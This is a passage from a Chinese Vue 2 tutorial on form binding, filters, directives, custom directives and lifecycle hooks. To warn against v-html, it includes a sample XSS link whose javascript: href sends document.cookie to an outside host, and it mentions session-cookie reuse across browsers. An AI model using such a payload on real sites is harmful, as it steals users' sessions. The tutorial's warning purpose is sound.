<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">所属校区：</span><br><span class="line"> <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-mode</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择校区<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;beijing&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shanghai&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;shenzhen&quot;</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>确认框：配置<code>value</code>，并且要有一个<code>String</code>类型的变量</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;agree&quot;</span>&gt;</span>阅读并接受协议<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>《用户协议》<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>给最外层的表单，添加<code>submit</code>事件，并阻止其默认行为，在其回调函数中发送<code>ajax</code>请求</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">form</span> @<span class="attr">submit.prevent</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">	...</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于要收集这些数据，一般在定义<code>data</code>时，会将表单中需要绑定数据定义在一个大的对象中</p>
<p>可以用<code>JSON.stringify(this.userInfo)</code>将收集到的数据，转化成<code>json</code>格式</p>
</li>
<li><p>数字类型的输入值，进行类型控制</p>
<ul>
<li><p>原生的使用<code>type = &quot;number&quot;</code>，控制用户只能输入数字</p>
</li>
<li><p><code>v-model</code></p>
<ul>
<li><p>修饰符<code>number</code>：控制收集到的数据是<code>Number</code>类型，而不是<code>String</code>类型，如果只是用<code>number</code>修饰符，那么输入<code>3a23</code>这种混合值时，只会收集到<code>3</code>，第一次遇到字符串<code>a</code>会停止收集（前台输入也没用）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">年龄 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">v-model.number</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修饰符<code>lazy</code>：输入框失去焦点时，再收集数据</p>
</li>
<li><p>修饰符<code>trim</code>：收集数据时，会去除输入值的前后空格（中间的空格不会去除）</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-16-2-小结：收集表单数据"><a href="#1-16-2-小结：收集表单数据" class="headerlink" title="1.16.2.小结：收集表单数据"></a>1.16.2.小结：收集表单数据</h3><ul>
<li>若<code>&lt;input type=&quot;text&quot;/&gt;</code>，则<code>v-model</code>收集的是<code>value</code>值，用户输入的就是<code>value</code>值</li>
<li>若<code>&lt;input type=&quot;radio&quot;/&gt;</code>，则<code>v-model</code>收集的是<code>value</code>值，且要给标签配置<code>value</code>值</li>
<li>若<code>&lt;input type=&quot;checkbox&quot;/&gt;</code><ul>
<li>没有配置<code>input</code>的<code>value</code>属性，那么收集的就是<code>checked</code>（勾选 &#x2F; 未勾选，是布尔值）</li>
<li>配置了<code>input</code>的<code>value</code>属性：<ul>
<li><code>v-model</code>的初始值是非数组，那么收集的就是<code>checked</code>（勾选 &#x2F; 未勾选，是布尔值）</li>
<li><code>v-model</code>的初始值是数组，那么收集的就是<code>value</code>组成的数组</li>
</ul>
</li>
</ul>
</li>
<li>备注：<code>v-model</code>的三个修饰符<ul>
<li><code>lazy</code>：失去焦点再收集数据</li>
<li><code>number</code>：输入的字符串转为有效的数字</li>
<li><code>trim</code>：输入首尾空格过滤</li>
</ul>
</li>
</ul>
<h2 id="1-17-过滤器"><a href="#1-17-过滤器" class="headerlink" title="1.17.过滤器"></a>1.17.过滤器</h2><h3 id="1-17-1-过滤器的基本使用"><a href="#1-17-1-过滤器的基本使用" class="headerlink" title="1.17.1.过滤器的基本使用"></a>1.17.1.过滤器的基本使用</h3><p>功能：对要显示的数据进行特定格式化后再显示</p>
<p>注意：并没有改变原本的数据，是产生新的对应的数据</p>
<p>过滤器的本质就是一个函数，将过滤器符号前的变量<code>time</code>作为默认参数传给<code>timeFormater</code>，然后用<code>timeFormater</code>的返回值，替换整个差值语法实现解析</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">    时间：&#123;&#123; time | timeFormater&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">   <span class="attr">filters</span>: &#123;</span><br><span class="line">       <span class="comment">// 过滤器可以对数据进行加工</span></span><br><span class="line">       <span class="title function_">timeFormater</span>(<span class="params">value</span>) &#123;</span><br><span class="line">           </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-17-2-过滤器传参"><a href="#1-17-2-过滤器传参" class="headerlink" title="1.17.2.过滤器传参"></a>1.17.2.过滤器传参</h3><p>当<code>timeFormater</code>有参数时，如<code>&#123;&#123; time | timeFormater('YYYY_MM_DD') &#125;&#125;</code>，其默认的第一个参数始终是管道符前的变量</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">    时间：&#123;&#123; time | timeFormater(&#x27;YYYY_MM_DD&#x27;)&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filters</span>: &#123;</span><br><span class="line">    <span class="title function_">timeFormater</span>(<span class="params">value, str</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且<code>es6</code>语法支持设置函数参数的默认值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filters</span>: &#123;</span><br><span class="line">    <span class="title function_">timeFormater</span>(<span class="params">value, str = <span class="string">&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;</span></span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-17-3-过滤器串联"><a href="#1-17-3-过滤器串联" class="headerlink" title="1.17.3.过滤器串联"></a>1.17.3.过滤器串联</h3><p>类似于管道符，可以串联多个过滤器</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">    时间：&#123;&#123; time | timeFormater(&#x27;YYYY_MM_DD&#x27;) | mySlice&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>备注：定义在配置对象中的过滤器，属于局部过滤器</p>
<h3 id="1-17-4-全局过滤器"><a href="#1-17-4-全局过滤器" class="headerlink" title="1.17.4.全局过滤器"></a>1.17.4.全局过滤器</h3><p>假设有两个<code>vm</code>实例，可以定义全局过滤器实现复用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vue.filter(&#x27;mySlice&#x27;, function(value) &#123;</span><br><span class="line">	return value.slice(0, 4)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>过滤器除了应用在差值语法上，在单向数据动态绑定时，也可以使用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">:x</span> = <span class="string">&quot;address | mySlice&quot;</span>&gt;</span></span><br><span class="line">    地址</span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="1-17-8-小结：过滤器"><a href="#1-17-8-小结：过滤器" class="headerlink" title="1.17.8.小结：过滤器"></a>1.17.8.小结：过滤器</h3><ul>
<li>定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理）</li>
<li>语法：<ul>
<li>注册过滤器<ul>
<li><code>Vue.filter(name, callback)</code>或</li>
<li><code>new Vue(filters: &#123;&#125;)</code></li>
</ul>
</li>
<li>使用过滤器<ul>
<li><code>&#123;&#123; xxx | 过滤器名 &#125;&#125;</code>或</li>
<li><code>v-bind:属性 = &quot;xxx | 过滤器名&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li>备注：<ul>
<li>过滤器也可以接收额外参数，多个过滤器也可以串联</li>
<li>并没有改变原本的数据，是产生新的对应的数据</li>
</ul>
</li>
</ul>
<h2 id="1-18-内置指令"><a href="#1-18-内置指令" class="headerlink" title="1.18.内置指令"></a>1.18.内置指令</h2><h3 id="1-18-1-学过的指令"><a href="#1-18-1-学过的指令" class="headerlink" title="1.18.1.学过的指令"></a>1.18.1.学过的指令</h3><ul>
<li><code>v-bind</code>：单向绑定解析表达式，可简写成<code>:xxx</code></li>
<li><code>v-model</code>：双向数据绑定</li>
<li><code>v-for</code>：遍历数组&#x2F;对象&#x2F;字符串</li>
<li><code>v-on</code>：绑定事件监听，可简写成<code>@</code></li>
<li><code>v-if</code>：条件渲染（动态控制节点是否存在）</li>
<li><code>v-else</code>：条件渲染（动态控制节点是否存在）</li>
<li><code>v-show</code>：条件渲染（动态控制节点是否展示）</li>
</ul>
<h3 id="1-18-2-v-text"><a href="#1-18-2-v-text" class="headerlink" title="1.18.2.v-text"></a>1.18.2.<code>v-text</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;&lt;h3&gt;sai&lt;/h3&gt;&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>v-text</code>会把所有的字符串都解析在页面上（即使包含了<code>html</code>标签），并且会覆盖原来节点里的内容</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220522190522128.png" alt="image-20220522190522128"></p>
<ul>
<li>作用：向其所在节点中渲染文本内容</li>
<li>与差值语法的区别：<code>v-text</code>会替换掉文本内容，而差值语法不会</li>
</ul>
<h3 id="1-18-3-v-html"><a href="#1-18-3-v-html" class="headerlink" title="1.18.3.v-html"></a>1.18.3.<code>v-html</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;name&quot;</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;&lt;h3&gt;sai&lt;/h3&gt;&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>v-html</code>会解析字符串里的<code>html</code>标签</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220522190306943.png" alt="image-20220522190306943"></p>
<p><code>cookie</code></p>
<ul>
<li><p>工作原理简易图示</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220523070301284.png" alt="image-20220523070301284"></p>
<p>可以通过<code>document.cookie</code>获取用户本地的<code>cookie</code>，如果被<code>httponly</code>限制了，则该方式获取不到</p>
<p>手动演示，在谷歌浏览器上登录<code>github</code>后，使用插件粘贴在火狐浏览器上，火狐浏览器也登录了</p>
</li>
<li><p><code>v-html</code>风险</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span>点我获取资源<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">str</span>: <span class="string">&#x27;&lt;a href=javascript:location.href=&quot;http://www.baidu.com? + document.cookie&quot;&gt;有资源！！快点我！！&lt;/a&gt;&#x27;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>如果使用不当，会导致<code>xss</code>攻击</p>
</li>
</ul>
<p>小结：<code>v-html</code></p>
<ul>
<li>作用：向指定节点中渲染包含<code>html</code>结构的内容</li>
<li>与差值语法的区别<ul>
<li><code>v-html</code>会替换掉节点中所有的内容，差值语法则不会</li>
<li><code>v-html</code>可以识别<code>html</code>结构</li>
</ul>
</li>
<li>严重注意，使用<code>v-html</code>要注意安全性问题<ul>
<li>在网站上动态渲染任意<code>HTML</code>是非常危险的，容易导致<code>xss</code>攻击</li>
<li>一定要在可信内容上，使用<code>v-html</code>，永远不要再用户提交的内容上使用</li>
</ul>
</li>
</ul>
<h3 id="1-18-4-v-cloak"><a href="#1-18-4-v-cloak" class="headerlink" title="1.18.4.v-cloak"></a>1.18.4.<code>v-cloak</code></h3><p>如果<code>vue.js</code>延迟加载了，页面上会出现很多插值语法，为了隐藏这些插值语法使用<code>v-cloak</code>属性，并给该配置添加<code>css</code>属性</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[v-cloak]</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span></span><br><span class="line">    &#123;&#123;name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>vue</code>实例接管容器的一瞬间，会将<code>v-cloak</code>属性删除，此时页面就会正常显示。</p>
<p>解决的问题：当网速过慢时，可以不让未经解析的模板跑到页面上</p>
<h3 id="1-18-5-v-once"><a href="#1-18-5-v-once" class="headerlink" title="1.18.5.v-once"></a>1.18.5.<code>v-once</code></h3><p>只会加载一次变量的值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span></span><br><span class="line">    初始值是：&#123;&#123;name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>v-once</code>修饰符的插值语法，只会解析一次</p>
<p>小结：</p>
<ul>
<li><code>v-once</code>所在节点在初次动态渲染后，就视为静态内容了</li>
<li>以后数据的改变，不会引起<code>v-once</code>所在结构的更新，可以用于优化性能</li>
</ul>
<h3 id="1-18-6-v-pre"><a href="#1-18-6-v-pre" class="headerlink" title="1.18.6.v-pre"></a>1.18.6.<code>v-pre</code></h3><ul>
<li>跳过其所在节点的编译过程</li>
<li>可利用它跳过：没有使用指令语法，没有使用插值语法的节点，会加快编译</li>
</ul>
<h2 id="1-19-自定义指令"><a href="#1-19-自定义指令" class="headerlink" title="1.19.自定义指令"></a>1.19.自定义指令</h2><p>需求1：定义一个<code>v-big</code>指令，和<code>v-text</code>功能类似，但会把绑定的数值放大10倍</p>
<p>需求2：定义一个<code>v-fbind</code>指令，和<code>v-bind</code>功能类似，但可以让其所绑定的<code>input</code>元素默认获取焦点</p>
<h3 id="1-19-1-函数形式"><a href="#1-19-1-函数形式" class="headerlink" title="1.19.1.函数形式"></a>1.19.1.函数形式</h3><p>使用<code>directives</code>配置项实现自定义指令</p>
<ul>
<li><p>函数形式</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">directives</span>: &#123;</span><br><span class="line">    <span class="attr">big</span>: <span class="keyword">function</span>(<span class="params">element, binding</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 简写</span></span><br><span class="line">    <span class="title function_">big</span>(<span class="params">element, binding</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">dir</span>(element)</span><br><span class="line">    	<span class="variable language_">console</span>.<span class="title function_">log</span>(element, element <span class="keyword">instanceof</span> <span class="title class_">HTMLElement</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(binding)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>形参<code>element</code>是拿到的真实<code>dom</code>，可以用<code>console.dir()</code>方法打印查看，或<code>element instanceof HTMLElement来判断</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220523164101003.png" alt="image-20220523164101003"></p>
</li>
<li><p>形参<code>binding</code>是<code>vue</code>提供的绑定对象，其具体属性如下：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220523172724160.png" alt="image-20220523172724160"></p>
</li>
<li><p>操作真实的<code>dom</code>元素:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值为：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍后的n值为：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">directives</span>: &#123;</span><br><span class="line">    <span class="title function_">big</span>(<span class="params">element, binding</span>) &#123;</span><br><span class="line">        element.<span class="property">innerText</span> = binding.<span class="property">value</span> * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220523191342634.png" alt="image-20220523191342634"></p>
<p><code>big</code>函数的调用时机：</p>
<ul>
<li>指令和元素成功绑定时（初始化）<ul>
<li>此时模板还没有被解析成真实<code>dom</code></li>
</ul>
</li>
<li>指令所在的模板，被重新解析时<ul>
<li>可能是其他数据发生了改变，引起了模板重新解析</li>
</ul>
</li>
<li>缺点：<ul>
<li>无法在模板被解析成真实<code>dom</code>时被调用</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-19-2-对象形式"><a href="#1-19-2-对象形式" class="headerlink" title="1.19.2.对象形式"></a>1.19.2.对象形式</h3><ul>
<li><p>对象形式</p>
<ul>
<li>要实现需求二，注意<code>focus()</code>方法要在元素被插入页面时调用</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">directives</span>: &#123;</span><br><span class="line">	<span class="attr">fbind</span>: &#123;</span><br><span class="line">        <span class="comment">// 指令和元素成功绑定时（一上来）</span></span><br><span class="line">        <span class="title function_">bind</span>(<span class="params">element, binding</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;bind&#x27;</span>)</span><br><span class="line">            element.<span class="property">value</span> = binding.<span class="property">value</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 指令所在元素被插入页面时</span></span><br><span class="line">        <span class="title function_">inserted</span>(<span class="params">element, binding</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;inserted&#x27;</span>)</span><br><span class="line">            element.<span class="title function_">focus</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 指令所在的模板被重新解析时</span></span><br><span class="line">        <span class="title function_">update</span>(<span class="params">element, binding</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;update&#x27;</span>)</span><br><span class="line">            element.<span class="property">value</span> = binding.<span class="property">value</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>很多时候，<code>bind()</code>和<code>update()</code>函数，其内容是一样的，所以<code>vue</code>提供了函数的写法，相当于调用了<code>bind()</code>和<code>update()</code>，这三个函数其实就是回调函数，<code>vue</code>会在不同的时候帮我们调用这些函数</p>
</li>
</ul>
<h3 id="1-19-3-小结：自定义指定"><a href="#1-19-3-小结：自定义指定" class="headerlink" title="1.19.3.小结：自定义指定"></a>1.19.3.小结：自定义指定</h3><ul>
<li><p>定义语法</p>
<ul>
<li><p>局部指令</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">directives</span>: &#123;</span><br><span class="line">        指令名： 函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">directives</span>: &#123;</span><br><span class="line">        指令名：&#123; <span class="comment">// 配置对象</span></span><br><span class="line">        	<span class="comment">//三个时机的回调函数</span></span><br><span class="line">        	<span class="title function_">bind</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">        	<span class="title function_">inserted</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">    		<span class="title function_">update</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>全局指令</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(指令名, 回调函数)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(指令名, &#123; <span class="comment">//第二个参数为配置对象</span></span><br><span class="line">    <span class="comment">//三个时机的回调函数</span></span><br><span class="line">    <span class="title function_">bind</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">    <span class="title function_">inserted</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">    <span class="title function_">update</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>配置对象中，常用的三个回调</p>
<ul>
<li><code>bind</code>：指令与元素成功绑定时的回调</li>
<li><code>inserted</code>：指令所在元素被插入到页面时调用</li>
<li><code>update</code>：指令所在模板结构被重新解析时调用</li>
</ul>
</li>
<li><p>备注：</p>
<ul>
<li>指令定义时不用加<code>v-</code>，但使用时需要加<code>v-</code></li>
<li>指令名如果是多个单词，要使用<code>kebab-case</code>命名方式<code>(user-name)</code>，不要使用<code>camelCase</code>命名方式<code>(userName)</code></li>
</ul>
</li>
</ul>
<h2 id="1-20-生命周期"><a href="#1-20-生命周期" class="headerlink" title="1.20.生命周期"></a>1.20.生命周期</h2><h3 id="1-20-1-引出生命周期"><a href="#1-20-1-引出生命周期" class="headerlink" title="1.20.1.引出生命周期"></a>1.20.1.引出生命周期</h3><p>想要页面加载完时，执行一个渐变操作，该如何实现？</p>
<p>真实开发时，一般不会用变量接收<code>vm</code>实例，更不会操作<code>vm</code>实例</p>
<p><code>mounted()</code>调用时机</p>
<ul>
<li><code>Vue</code>完成模板的解析，并把初始的真实的<code>dom</code>元素放入页面后（完成挂载），调用<code>mounted</code> </li>
<li>只会调用一次</li>
<li>所谓的生命周期，就是一个函数，<code>vue</code>会在特定的时机帮你调用特定的函数</li>
</ul>
<p>小结：</p>
<ul>
<li>生命周期，又叫生命周期回调函数、生命周期钩子函数</li>
<li>是什么：<code>vue</code>在关键时刻帮我们调用的一些特殊名称的函数</li>
<li>生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的</li>
<li>生命周期中的<code>this</code>指向的是<code>vm</code>或组件实例对象</li>
</ul>
